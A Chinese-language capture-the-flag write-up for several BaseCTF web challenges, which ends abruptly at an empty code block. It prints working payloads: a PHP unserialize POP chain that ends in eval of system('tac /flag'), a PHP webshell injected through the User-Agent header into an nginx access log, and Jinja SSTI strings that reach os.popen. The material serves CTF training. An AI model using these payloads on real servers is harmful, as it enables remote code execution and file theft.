+ search

> 函数类似于 match，不同之处在于不限制正则表达式的开始匹配位置
>

### 题解：
使用 python 脚本运算

```python
import requests
import re

url = 'http://gz.imxbt.cn:20851/'

s = requests.Session()
value = 0
while True:
    r = s.post(url, {'answer':value})
    //猜测flag没有被编码，直接用BaseCTF匹配
    if 'BaseCTF' in r.text:
        print(r.text)
        break
    //使用正则表达式匹配数学公式，并利用括号分组
    expression = re.search(r'(\d+)(.)(\d+)',r.text)
    //group(2)就是匹配得到的运算符
    if expression.group(2) == '+':
        value = int(expression.group(1)) + int(expression.group(3))
    if expression.group(2) == '-':
        value = int(expression.group(1)) - int(expression.group(3))
    if expression.group(2) == '×':
        value = int(expression.group(1)) * int(expression.group(3))
    if expression.group(2) == '÷':
        value = int(expression.group(1)) / int(expression.group(3))
```

补充：

像这种算术题，如果乘和除用的是' * ' 和 ' / ' 那么我们可以直接匹配整个句子（不分组）

再利用 python 的 eval（）函数，直接执行这个句子得到结果。

结果

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731249827760-64a8ba4d-07fc-44f0-887a-e11fc64b3311.png)

## Really EZ POP
### 考点：
**pop 链构造**

**php 私有属性修改内容**

+ 方法一：

> 在类内规定新创建一个 public 方法来更改私有属性或者使用 __construct() 方法在创建对象时，直接修改私有属性
>

+ 方法二：[参考文章](https://www.cnblogs.com/wangyuming/p/7447837.html)

>  通过使用 PHP 的反射机制访问和修改类的私有属性：  
>

### 题解：
进入题目，得源码加注释后如下

```php
<?php
// 输出当前文件的源代码，用于调试或展示代码结构
highlight_file(__FILE__);

// Sink类定义
class Sink
{
    // 私有属性，初始设置了一个要执行的命令字符串，这里初始是简单的输出123
    private $cmd = 'echo 123;';

    // 当对象被当作字符串使用时会自动调用此方法
    public function __toString()
    {
        // 使用eval函数执行存储在$cmd属性中的命令字符串
        // 这里存在安全风险，如果能控制$cmd的值，就可执行任意PHP代码
        eval($this->cmd);
    }
}

// Shark类定义
class Shark
{
    // 私有属性，存储了一个字符串
    private $word = 'Hello, World!';

    // 当对象被当作函数调用时会自动调用此方法
    public function __invoke()
    {
        // 输出一段包含$word属性值的字符串
        echo 'Shark says:'. $this->word;
    }
}

// Sea类定义
class Sea
{
    // 公共属性，用于存储一个对象（可能是具有可调用行为的对象，如实现了__invoke方法的对象）
    public $animal;

    // 当访问不存在的属性时会自动调用此方法
    public function __get($name)
    {
        // 获取$animal属性的值，这里假设它是一个可调用的对象
        $sea_ani = $this->animal;
        // 输出一段描述性字符串，包含调用$sea_ani对象（当作函数调用）的结果
        echo 'In a deep deep sea, there is a '. $sea_ani();
    }
}

// Nature类定义
class Nature
{
    // 公共属性，用于存储一个Sea类的对象（或其他相关对象）
    public $sea;

    // 当对象被销毁时会自动调用此方法
    public function __destruct()
    {
        // 尝试输出$sea对象的see属性的值
        // 这里可能存在问题，如果$sea对象没有see属性，会产生错误
        echo $this->sea->see;
    }
}

// 检查是否有通过POST方式提交的名为'nature'的数据
if ($_POST['nature']) {
    // 对提交的名为'nature'的数据进行反序列化操作
    // 如果用户能控制此数据，可能通过构造恶意序列化数据来利用代码中的漏洞
    // 比如控制Sink类中的$cmd属性值来执行恶意代码等
    $nature = unserialize($_POST['nature']);
}
```

**大体思路:**

**反序列化->Nature 类的 __destruct() 函数 [ 访问未定义的变量 ]->Sea 类的 __get（）函数 [ 对象被当作函数调用 ] -> Shark 类的 __invoke()函数 [ 字符串拼接 ]->Sink 类的 __toString() 函数 [ 调用 eval（）函数 ]**

**方法一：**

```php
<?php

class Sink
{
    private $cmd = "system('ls /');";
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
    public function setword($a)
    {
        $this->word = $a;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

//if ($_POST['nature']) {
//    $nature = unserialize($_POST['nature']);
//}

$nature = new Nature();
$sea = new Sea();
$shark = new Shark();
$sink = new Sink();


$sea->animal = $shark;
$nature->sea = $sea;

$shark->setword($sink);
echo 'nature='.urlencode(serialize($nature));
```

**方法二：**

```python
<?php
class Sink
{
    private $cmd = 'system("tac /flag");';
    public function __toString() // 当对象被当做字符串时自动调用（找echo $this->a这种、strtolower()等）
    {
        eval($this->cmd);  // 1 system("ls");
    }
}
 
class Shark
{
    private $word;
    public function __invoke()  // 对象被当做函数进行调用时触发（找有括号的类似$a()这种）
    {
        echo 'Shark says: ' . $this->word;  // 2 Sink
    }
}
 
class Sea
{
    public $animal;
    public function __get($name)  // 调用类中不存在变量时触发（找有连续箭头的 this->a->b）
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();  // 3 Shark
    }
}
 
class Nature
{
    public $sea;
 
    public function __destruct()  // 对象被销毁时自动触发，也就是我们的链头了
    {
        echo $this->sea->see;  // 4 Sea
    }
}
 
// 按照 1 2 3 4 的顺序编写 pop
$s1 = new Sink();
$s2 = new Shark();

// 创建一个反射对象
$reflection = new ReflectionClass($s2);
// 通过反射获取指定名称为'word'的属性对象
$property = $reflection->getProperty('word'); 

// 设置该属性为可访问状态，这一步通常在属性是私有或受保护的情况下是必要的
// 这样后续才能对其进行取值或赋值等操作
$property->setAccessible(true); 

// 将变量 $s1 的值设置给对象 $s2 的'word'属性
// 这里假设 $s2 是拥有'word'属性的对象实例，$s1 是要赋给该属性的值
$property->setValue($s2, $s1); 
 
$s3 = new Sea();
$s3->animal = $s2;
$n = new Nature();
$n->sea = $s3;
 
echo 'nature='.urlencode(serialize($n));
 
?>
```

题目中提示了 hackbar 没有回显，这里使用 burp 传参

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731736430881-8a460663-f6d6-4cf2-b1c5-34e1618655a2.png)

得到列表，接下来 cat 内容。结束

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731736513061-9c66f40c-5ce4-45b4-a85e-7c32278b51e4.png)

# week3
## 滤个不停
### 考点：
**nginx 访问日志写入 shell**

首先了解什么是 nginx，[参考文章](https://www.cnblogs.com/wcwnina/p/8728391.html)

nginx 和 apache 都是 web 服务器，而这两个服务器在运行时服务器下肯定有预先设置好的各种日志文件，进而可以利用这些日志文件写入 shell ，从而获取 flag

对于 nginx 而言，

+  /var/log/nginx/error.log： error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期的处理流程相关的信息。  
+ /var/log/nginx/access.log： access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。

对于 apach 而言，

+ /var/log/apache/access.log :与 nginx 的 access.log 类似。

总之，可以利用这些日志文件，在里面写入 shell，从而获取 flag。

### 题解：
```php
<?php
// 开启语法高亮显示当前文件的代码，方便查看代码结构及语法（通常在调试或展示代码时使用）
highlight_file(__FILE__);
// 关闭PHP的错误报告，这意味着PHP代码在执行过程中遇到错误时不会显示详细的错误信息
// 在实际开发中，一般仅在生产环境且已经充分测试确保无问题时才建议这样设置，开发阶段建议开启错误报告以便排查问题
error_reporting(0);

// 从POST请求数据中获取名为'incompetent'的变量值，并赋值给$incompetent变量
$incompetent = $_POST['incompetent'];
// 从POST请求数据中获取名为'Datch'的变量值，并赋值给$Datch变量
$Datch = $_POST['Datch'];

// 判断$incompetent的值是否不等于'HelloWorld'
if ($incompetent!== 'HelloWorld') {
    // 如果不等于'HelloWorld'，则输出提示信息并终止脚本执行
    die('写出程序员的第一行问候吧！');
}

// 定义一个包含特定字符的数组，这里的字符可能与后续要验证的文件名或路径等相关（具体作用需结合更多上下文确定）
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
// 初始化一个变量$is_valid为true，用于后续验证是否满足条件的标记
$is_valid = true;

// 遍历$required_chars数组中的每个字符
foreach ($required_chars as $char) {
    // 使用strpos函数在$Datch字符串中查找当前字符$char，如果未找到（返回false）
    if (strpos($Datch, $char) === false) {
        // 则将$is_valid标记设置为false，表示不满足条件
        $is_valid = false;
        // 并使用break语句跳出当前循环，因为只要有一个字符不满足条件就无需继续检查其他字符了
        break;
    }
}

// 如果$is_valid为true，即前面的字符验证都通过了
if ($is_valid) {
    // 定义一个包含多种协议相关字符串的数组，这些协议通常用于文件包含等操作时可能存在安全风险的情况
    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://', 'data://', 'gopher://'];

    // 遍历$invalid_patterns数组中的每个协议字符串
    foreach ($invalid_patterns as $pattern) {
        // 使用stripos函数在不区分大小写的情况下在$Datch字符串中查找当前协议字符串$pattern，如果找到了（返回值不等于false）
        if (stripos($Datch, $pattern)!== false) {
            // 则输出提示信息并终止脚本执行，防止可能的安全风险操作
            die('此路不通换条路试试?');
        }
    }

    // 如果前面的验证都通过了，这里使用include函数包含由$Datch指定的文件（这里假设$Datch是一个文件名或文件路径）
    include($Datch);
} else {
    // 如果$is_valid为false，即前面的字符验证未通过，则输出提示信息并终止脚本执行
    die('文件名不合规 请重试');
}
?>
```

第一个参数不再多说

第二个参数，进行了两次认证，一次是 strpos(** **查找字符串首次出现的位置，不区分大小写)，一次是 stripos(查找字符串首次出现的位置，区分大小写)

拓展：

strpos()函数可以用数组绕过和%0a(换行)绕过。返回值为 false，刚好可以绕过第一个认证

但是这里有两个认证，这种方法不行。

看见请求头 sever 参数

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731488907046-7eaab307-7f7d-4a0b-bf11-6fb08f93b08b.png)

使用日志包含

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731489183836-5bba8b4b-8b8e-4910-8c43-91e8f1d3a968.png)

之后发现回显都是 ua 头里的内容，在 ua 头里加入 <?php eval(system('cat /flag'))?>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731491587205-6fba3597-3c35-43e0-8d2c-9aaae96eb93c.png)

得到 flag

## 玩原神玩的
### 考点：
1.异或运算符（^）

0   ^   0   =   0

0   ^   1   =   1

1   ^   0   =   1

1   ^   1   =   0

正常的整数不止有 0 和 1 怎么办，那就是对二进制后的各位进行异或运算

```php
$a = 3; // 二进制为011
$b = 5; // 二进制为101
echo $a ^ $b;
```

> 结果为 6 //二进制为 110（正是各位二进制之后的结果）
>

应用：

使用异或运算可以用来交换两个参数的值（不需要使用中间变量），以下以 php 语言演示

```php
<?php
   function swap($a, $b)
   {	//a=3(011)	b=5(101)
       $a = $a ^ $b;	//异或之后，a变为110
       $b = $a ^ $b;  //a(110)和b(101)，运算之后，b（011）也就是原来a的值
       $a = $a ^ $b;	//a(110)和b(011)，运算之后，a（101）也就是原来b的值
       echo 'a='.$a.PHP_EOL.'b='.$b;
   }

   swap(3,5);

//输出结果：
a=5
b=3
```

总结：

一数和二数进行进行异或运算得到的值。一数与整个值进行异或运算将得到二数的值，二数与这个值进行异或运算将得到一数的值。

2.ord()函数

获取该字符的 ascii 值

### 题解：
进入题目，发现源码

```php
<?php
// 开启语法高亮显示当前文件的代码，方便在出现错误等情况时查看代码结构
highlight_file(__FILE__);
// 关闭PHP的错误报告，这样在代码执行过程中遇到错误时不会显示详细的错误信息到页面上
error_reporting(0);

// 引入名为flag.php的文件，通常这里面可能包含了要获取的目标 flag 信息等
include 'flag.php';

// 检查通过POST方法提交的名为'len'的数据的元素个数是否与变量$array的元素个数相等
if (sizeof($_POST['len']) == sizeof($array)) {
    // 如果相等，调用ys_open函数并传入通过GET方法获取的名为'tip'的值作为参数
    ys_open($_GET['tip']);
} else {
    // 如果不相等，输出错误信息并终止脚本执行，表示输入不符合要求就不能继续进行后续操作
    die("错了！就你还想玩原神？❌❌❌");
}

// 定义名为ys_open的函数，接受一个参数$tip
function ys_open($tip) {
    // 在函数内部，检查传入的参数$tip的值是否不等于 "我要玩原神"
    if ($tip!= "我要玩原神") {
        // 如果不等于，输出错误信息并终止函数执行，表示必须传入特定的值才能继续
        die("我不管，我要玩原神！😭😭😭");
    }
    // 如果$tip的值等于 "我要玩原神"，则调用dumpFlag函数
    dumpFlag();
}

// 定义名为dumpFlag的函数
function dumpFlag() {
    // 检查通过POST方法提交的名为'm'的数据是否未设置，或者其元素个数不等于2
    if (!isset($_POST['m']) || sizeof($_POST['m'])!= 2) {
        // 如果满足上述条件之一，输出错误信息并终止函数执行，表示提交的数据不符合要求
        die("可恶的QQ人！😡😡😡");
    }

    // 获取通过POST方法提交的名为'm'的数据中的第一个元素，赋值给变量$a
    $a = $_POST['m'][0];
    // 获取通过POST方法提交的名为'm'的数据中的第二个元素，赋值给变量$b
    $b = $_POST['m'][1];

    // 检查变量$a是否为空，或者变量$b是否为空，或者变量$a的值不等于 "100%"，或者变量$b的值不等于 "love100%" 拼接上变量$a的MD5值
    if (empty($a) || empty($b) || $a!= "100%" || $b!= "love100%". md5($a)) {
        // 如果满足上述条件之一，输出错误信息并终止函数执行，表示提交的数据不符合特定格式要求
        die("某站崩了？肯定是某忽悠干的！😡😡😡");
    }

    // 再次引入flag.php文件，这里可能是为了确保能获取到最新的flag相关信息（虽然前面已经引入过，但在函数内部再次引入可能有其特定需求）
    include 'flag.php';

    // 创建一个空数组$flag
    $flag[] = array();

    // 通过循环，根据变量$array的元素个数进行迭代
    for ($ii = 0; $ii < sizeof($array); $ii++) {
        // 对$array中的每个元素，先获取其ASCII码值，然后与循环变量$ii进行异或运算，最后对结果进行MD5加密，并将加密结果存入$flag数组对应位置
        $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
    }

    // 将$flag数组转换为JSON格式的字符串并输出到页面上
    echo json_encode($flag);
}
```

总结：

+ $len （$_POST）的长度等于 $array的长度
+ $tip（$_GET）= '我要玩原神'
+ $m（$_POST）长度为 2，且第一个元素等于字符串‘100%’，第二个元素等于字符串‘love100%’拼接‘100%’的 md5 值

首先，第一步要判断输入长度合适的 len 数组，使用脚本爆破

```python
import requests

url = 'http://gz.imxbt.cn:20279/'
for i in range(1, 100):
    payload = {f'len[{j}]': '0' for j in range(i)}
    resp = requests.post(url, data=payload)
    last_line = resp.text.splitlines()[-1]
    print(last_line)

    if '我不管，我要玩原神！😭😭😭' in last_line:
        print(f'长度是{i}\n')
        print('&'.join(f'len[{m}]=1' for m in range(i)))
        break
```

> 结果是 i=44,即 len 数组长度为 45
>

第二步

> /?tip = 我要玩原神
>

第三步

> m[0]=100%&m[1]=love100%30bd7ce7de206924302499f197c7a966
>

得到 json 数据

> ["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","642e92efb79421734881b53e1e1b18b6","2723d092b63885e0d7c260cc007e8b9d","a3c65c2974270fd093ee8a9bf8ae7d0b","65b9eea6e1cc6bb9f0cd2a47751a186f","66f041e16a60928b05a7e228a89c3799","a3c65c2974270fd093ee8a9bf8ae7d0b","b53b3a3d6ab90ce0268229151c9bde11","65b9eea6e1cc6bb9f0cd2a47751a186f","7f39f8317fbdb1988ef4c628eba02591","3416a75f4cea9109507cacd8e2f2aefc","7f6ffaa6bb0b408017b62254211691b5","1c383cd30b7c298ab50293adfecb7b18","182be0c5cdcd5072bb1864cdee4d3d6e","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","d67d8ab4f4c10bf22aa353e27879133c","d9d4f495e875a2e075a1a4a6e1b9770f","d645920e395fedad7bbbed0eca3fe2e0","b53b3a3d6ab90ce0268229151c9bde11","a0a080f42e6f13b3a2df133f073095dd","ec5decca5ed3d6b8079e2e7e7bacc9f2","3416a75f4cea9109507cacd8e2f2aefc","17e62166fc8586dfa4d1bc0e1742c08b","c0c7c76d30bd3dcaefc96f40275bdc0a","735b90b4568125ed6c3f678819b6e058","70efdf2ec9b086079795c442636b55fb","3c59dc048e8850243be8079a5c74d079","14bfa6bb14875e45bba028a21ed38046","7cbbc409ec990f19c78c75bd1e06f215","1f0e3dad99908345f7439f8ffabdffc4","34173cb38f07f89ddbebc2ac9128303f","6f4922f45568161a8cdf4ad2299f6d23","c16a5320fa475530d9583c34fd356ef5","28dd2c7955ce926456240b2ff0100bde","6f4922f45568161a8cdf4ad2299f6d23","1f0e3dad99908345f7439f8ffabdffc4","43ec517d68b6edd3015b3edc9a11367b"]
>

编写脚本破译

方法 1

> 就是正常的遍历
>

```python
import hashlib

md5_flag = ["3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584", "73278a4a86960eeb576a8fd4c9ec6997",
            "ec8956637a99787bd197eacd77acce5e", "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
            "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445", "642e92efb79421734881b53e1e1b18b6",
            "2723d092b63885e0d7c260cc007e8b9d", "a3c65c2974270fd093ee8a9bf8ae7d0b", "65b9eea6e1cc6bb9f0cd2a47751a186f",
            "66f041e16a60928b05a7e228a89c3799", "a3c65c2974270fd093ee8a9bf8ae7d0b", "b53b3a3d6ab90ce0268229151c9bde11",
            "65b9eea6e1cc6bb9f0cd2a47751a186f", "7f39f8317fbdb1988ef4c628eba02591", "3416a75f4cea9109507cacd8e2f2aefc",
            "7f6ffaa6bb0b408017b62254211691b5", "1c383cd30b7c298ab50293adfecb7b18", "182be0c5cdcd5072bb1864cdee4d3d6e",
            "9f61408e3afb633e50cdf1b20de6f466", "e369853df766fa44e1ed0ff613f563bd", "d67d8ab4f4c10bf22aa353e27879133c",
            "d9d4f495e875a2e075a1a4a6e1b9770f", "d645920e395fedad7bbbed0eca3fe2e0", "b53b3a3d6ab90ce0268229151c9bde11",
            "a0a080f42e6f13b3a2df133f073095dd", "ec5decca5ed3d6b8079e2e7e7bacc9f2", "3416a75f4cea9109507cacd8e2f2aefc",
            "17e62166fc8586dfa4d1bc0e1742c08b", "c0c7c76d30bd3dcaefc96f40275bdc0a", "735b90b4568125ed6c3f678819b6e058",
            "70efdf2ec9b086079795c442636b55fb", "3c59dc048e8850243be8079a5c74d079", "14bfa6bb14875e45bba028a21ed38046",
            "7cbbc409ec990f19c78c75bd1e06f215", "1f0e3dad99908345f7439f8ffabdffc4", "34173cb38f07f89ddbebc2ac9128303f",
            "6f4922f45568161a8cdf4ad2299f6d23", "c16a5320fa475530d9583c34fd356ef5", "28dd2c7955ce926456240b2ff0100bde",
            "6f4922f45568161a8cdf4ad2299f6d23", "1f0e3dad99908345f7439f8ffabdffc4", "43ec517d68b6edd3015b3edc9a11367b"]

flag = ''

for i in range(45):
    for j in range(127):
        if hashlib.md5(str(i ^ j).encode()).hexdigest() == md5_flag[i]:
            flag += chr(j)
print(flag)
```

方法 2

> 利用了上述讲的结论，先遍历出这个 MD5 加密前的数字
>
> 然后用数组序号与其异或运算就得到了该位置字符的 ascii 值
>

```python
import hashlib

md5_flag = ["3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584", "73278a4a86960eeb576a8fd4c9ec6997",
            "ec8956637a99787bd197eacd77acce5e", "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
            "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445", "642e92efb79421734881b53e1e1b18b6",
            "2723d092b63885e0d7c260cc007e8b9d", "a3c65c2974270fd093ee8a9bf8ae7d0b", "65b9eea6e1cc6bb9f0cd2a47751a186f",
            "66f041e16a60928b05a7e228a89c3799", "a3c65c2974270fd093ee8a9bf8ae7d0b", "b53b3a3d6ab90ce0268229151c9bde11",
            "65b9eea6e1cc6bb9f0cd2a47751a186f", "7f39f8317fbdb1988ef4c628eba02591", "3416a75f4cea9109507cacd8e2f2aefc",
            "7f6ffaa6bb0b408017b62254211691b5", "1c383cd30b7c298ab50293adfecb7b18", "182be0c5cdcd5072bb1864cdee4d3d6e",
            "9f61408e3afb633e50cdf1b20de6f466", "e369853df766fa44e1ed0ff613f563bd", "d67d8ab4f4c10bf22aa353e27879133c",
            "d9d4f495e875a2e075a1a4a6e1b9770f", "d645920e395fedad7bbbed0eca3fe2e0", "b53b3a3d6ab90ce0268229151c9bde11",
            "a0a080f42e6f13b3a2df133f073095dd", "ec5decca5ed3d6b8079e2e7e7bacc9f2", "3416a75f4cea9109507cacd8e2f2aefc",
            "17e62166fc8586dfa4d1bc0e1742c08b", "c0c7c76d30bd3dcaefc96f40275bdc0a", "735b90b4568125ed6c3f678819b6e058",
            "70efdf2ec9b086079795c442636b55fb", "3c59dc048e8850243be8079a5c74d079", "14bfa6bb14875e45bba028a21ed38046",
            "7cbbc409ec990f19c78c75bd1e06f215", "1f0e3dad99908345f7439f8ffabdffc4", "34173cb38f07f89ddbebc2ac9128303f",
            "6f4922f45568161a8cdf4ad2299f6d23", "c16a5320fa475530d9583c34fd356ef5", "28dd2c7955ce926456240b2ff0100bde",
            "6f4922f45568161a8cdf4ad2299f6d23", "1f0e3dad99908345f7439f8ffabdffc4", "43ec517d68b6edd3015b3edc9a11367b"]

flag = ''

for i in range(45):
    for j in range(128):
        if hashlib.md5(str(j).encode()).hexdigest() == md5_flag[i]:
            flag += chr(i^j)
print(flag)
```

## ez_php_jail 
### 考点：
**当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这**

**个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。**

****

**glob（）函数：**

**glob() 函数返回匹配指定模式的文件名或目录。**

**该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731751822850-ff1d9839-8225-4c65-98a0-8030fcd14fd7.png)

**highlight_file() 函数**

highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。

**提示：****用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。**

**注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752968766-5dc24e91-b2e5-4c30-bc56-dabed7536f9f.png)

### 题解：
进入题目

```php
<?php
// 使用highlight_file函数以语法高亮的形式输出当前正在执行的PHP文件（即__FILE__所代表的这个文件）的源代码。
// 这通常在代码调试、展示代码示例等场景下比较有用，方便查看代码结构和语法。
highlight_file(__FILE__); 

// 将PHP的错误报告级别设置为0，也就是关闭错误报告功能。
// 这样在代码执行过程中，即使出现了PHP错误（如语法错误、运行时错误等），也不会在页面上显示相应的错误信息。
// 但在实际开发中，一般不建议这样做，因为及时查看错误信息有助于快速定位和解决问题。
error_reporting(0); 

// 使用include语句包含一个名为"hint.html"的文件。
// 这意味着会将"hint.html"文件中的内容嵌入到当前PHP文件执行的位置。
// 通常用于引入一些额外的提示信息、页面布局相关的HTML内容等。
// 需要注意的是，如果"hint.html"文件不存在或者路径不正确，可能会导致警告或错误（不过由于设置了关闭错误报告，可能看不到这些提示）。
include("hint.html"); 

// 从通过HTTP GET方法提交的请求参数中获取名为"Jail_by.Happy"的参数值，并将其赋值给变量$Jail。
// 这表明外部可以通过在访问该PHP页面的URL中添加相应的参数（例如：http://example.com/this_file.php?Jail_by.Happy=some_value）来传递数据给这个脚本，进而影响后续代码的执行。
$Jail = $_GET['Jail_by.Happy']; 

// 判断变量$Jail的值是否为null，即检查是否成功获取到了名为"Jail_by.Happy"的GET参数。
// 如果$Jail的值为null，说明没有接收到该参数，那么就执行die函数，输出提示信息"Do You Like My Jail?"，然后终止脚本的执行。
if ($Jail == null) die("Do You Like My Jail?"); 

// 定义一个名为Like_Jail的函数，该函数接受一个参数$var，用于对传入的字符串进行特定规则的检查。
function Like_Jail($var) {
    // 在函数内部，使用preg_match函数结合正则表达式对传入的参数$var进行匹配检查。
    // 正则表达式'/(`|\$|a|c|s|require|include)/i'的含义是：不区分大小写地检查字符串$var中是否包含反引号（`）、美元符号（$）、字母a、字母c、字母s、require关键字或者include关键字。
    // 如果在$var中匹配到了上述任何一个字符，就返回false，表示该字符串不符合函数所设定的要求。
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    // 如果在$var中没有匹配到上述被限制的字符，就返回true，表示该字符串符合函数所设定的要求。
    return true;
}

// 调用Like_Jail函数，并将变量$Jail作为参数传入，对获取到的$Jail变量的值进行检查。
// 根据Like_Jail函数的返回结果来决定后续的操作。
if (Like_Jail($Jail)) {
    // 如果Like_Jail函数返回true，说明变量$Jail的值符合函数内部设定的要求，此时就使用eval函数来执行变量$Jail所代表的PHP代码。
    // 需要注意的是，eval函数是一个非常危险的函数，因为它可以直接执行传入的任意PHP代码，
    // 如果外部传入了恶意代码，那么这些恶意代码将会被执行，从而可能导致安全漏洞，如服务器被入侵、数据泄露等问题。
    eval($Jail); 
    // 在eval函数成功执行完变量$Jail所代表的PHP代码后，输出提示信息"Yes! you escaped from the jail! LOL!"。
    echo "Yes! you escaped from the jail! LOL!";
} else {
    // 如果Like_Jail函数返回false，说明变量$Jail的值不符合函数内部设定的要求，此时输出提示信息"You will Jail in your life!"。
    echo "You will Jail in your life!";
}

// 输出一个换行符，用于在页面输出结果中进行换行，使输出内容更加清晰、美观，便于阅读。
echo "\n"; 

// 此处注释提到在HTML解析后再输出PHP源代码，但从当前给出的代码来看，并没有明确体现出如何在HTML解析后准确输出PHP源代码的具体实现逻辑。
// 可能需要结合其他相关代码（如在HTML模板中通过特定的标签或脚本逻辑来实现等）来完成这一操作，但仅就这段代码而言，无法确定具体的实现方式。

?>
```

ctrl+U 查看源码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752361480-30d40cf5-0310-4a40-8042-63d5a27a0028.png)

解码一下，得到

> ph0_info_Like_jail.php
>

访问这个页面，得到 phpinfo

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752527774-9b11bc5e-f22b-4eb9-a75c-86afbb49e436.png)

我们只是用 glob（）函数没有用，因为我们只返回了一个文件路径

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752693627-f29aa4a0-ac2b-4da7-bd4c-3cc896fea424.png)

借助 highlight_file（）函数高亮显示文件中的代码

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731752846423-cad02c4e-f445-4449-ab13-28f11b32e8e8.png)





## 复读机
### 考点
**SSTI(模板注入)：**[**参考文章**](https://www.cnblogs.com/bmjoker/p/13508538.html)

当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

**常用的类和方法**

> __class__用来查看变量所属的类
>
> 
>
> __bases__用来查看类的基类，就是父类（或者__base__）
>
> 
>
> __mro__：显示类和基类
>
> 
>
> __subclasses__()：查看当前类的子类
>
> 
>
> __getitem__：对数组字典的内容提取
>
> 
>
> __init__  : 初始化类，返回的类型是function
>
> 
>
> __globals__:查看全局变量，有哪些可用的函数方法等，然后再搜索popen，eval等
>
> 
>
> __builtins__:提供对Python的所有"内置"标识符的直接访问,即先加载内嵌函数再调用
>
> 
>
> __import__   ： 动态加载类和函数，用于导入模块，经常用于导入os模块（例如__import__('os').popen('ls').read()）
>
> 
>
> url_for ：flask的方法，可以用于得到__builtins__
>
> 
>
> lipsum ：flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
>
> 
>
> config：当前application的所有配置。
>
> 
>
> popen():执行一个 shell 以运行命令来开启一个进程
>
> 
>
> request.args.key：获取get传入的key的值
>

**SSTI漏洞利用基本流程**

获取当前类 -> 获取其object基类 -> 获取所有子类 -> 获取可执行shell命令的子类 -> 获取可执行shell命令的方法 -> 执行shell命令

### 题解
发现对关键字和一些符号有过滤

```plain
+ - * / . {{ }} __ : " \
```

获取''的类

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821091968-b57a671e-5b41-41de-aaa0-fed672ac826b.png)

再获取基类‘object’

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821183133-e0faf2d1-f446-483d-aed0-7b47715480de.png)

再获取‘object’的所有派生类

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821505936-04dd4a83-9a0a-4ed0-8023-0d771dd5f028.png)

在网页里看不下来，到 burp 里看

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821521645-e7565e8b-0c60-4cc2-937b-010c8c7db68d.png)

寻找可以 RCE 的类，使用数组序号选择这个类

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821707338-751a9eaa-9ad9-43cc-b52d-c53b67b83c07.png)

然后创建类，然后 globals 获取所有模块和方法，寻找可以读代码的方法

 **os.popen() 方法用于从一个命令打开一个管道。**  

因为禁用了/，所以找方法进入根目录

**使用环境变量**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731823845600-a161606b-02f4-49d2-80c7-5522eb1820d4.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821780964-c841daf5-6d90-4a1c-8a65-b9e6deccc411.png)



![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731821851494-27ea41df-e0b1-4014-915d-f9674127a095.png)

最终输入如下

```php
